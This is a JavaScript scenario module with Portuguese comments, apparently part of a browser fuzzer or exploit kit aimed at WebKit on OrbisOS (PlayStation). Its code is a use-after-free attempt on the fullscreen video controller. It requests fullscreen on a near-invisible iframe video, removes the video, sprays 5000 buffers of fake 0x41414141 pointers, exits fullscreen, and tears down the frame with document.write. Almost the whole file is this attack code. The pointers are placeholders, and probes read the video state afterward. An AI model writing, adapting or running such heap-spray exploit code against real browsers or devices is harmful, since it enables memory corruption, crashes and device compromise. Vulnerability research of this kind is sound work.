/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (The Leandro's Teardown)
 * Alvo: FullscreenVideoController + FrameLoader Teardown
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Incorpora o delay de 500ms e o document.write teardown para forçar ' +
                 'o crash do FullscreenController usando um Iframe como sandbox, ' +
                 'tentando injetar ponteiros falsos (0x41414141).',

    setup: async function() {
        // Criamos um Iframe para isolar o ataque e proteger o Fuzzer
        this.iframe = document.createElement('iframe');
        this.iframe.setAttribute('allowfullscreen', 'true');
        this.iframe.style.opacity = '0.01'; // Quase invisível
        document.body.appendChild(this.iframe);

        const doc = this.iframe.contentDocument;
        this.video = doc.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        doc.body.appendChild(this.video);

        // O nosso payload malicioso (Ponteiros 0x41414141)
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // 1. Entramos em Fullscreen no contexto do Iframe
            if (this.video.webkitRequestFullscreen) this.video.webkitRequestFullscreen();

            // 2. O seu segredo: 500ms para o OrbisOS preparar a superfície gráfica perfeitamente
            await new Promise(r => setTimeout(r, 500));

            // 3. FREE: Apagamos o vídeo
            this.video.remove();

            // 4. REUSE (SPRAY): Preenchemos o buraco com 5000 buffers falsos
            this.spray = [];
            for (let i = 0; i < 5000; i++) {
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

            // 5. USE: Dizemos ao sistema para sair do Fullscreen
            if (document.webkitExitFullscreen) document.webkitExitFullscreen();

            // 6. O TEARDOWN: O seu segundo segredo.
            // Executamos o document.write de forma assíncrona logo após o exit.
            // Isto destrói a base do C++ enquanto o controlador ainda tenta ler a memória.
            setTimeout(() => {
                try {
                    this.iframe.contentDocument.write('PWNED');
                    this.iframe.contentDocument.close();
                } catch(e) {}
            }, 10);

        } catch(e) {}
    },

    probe: [
        s => s.video.readyState,
        s => s.video.networkState,
        s => s.video.webkitDecodedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        try { this.iframe.remove(); } catch(e) {}
        this.spray = null;
        this.video = null;
    }
};
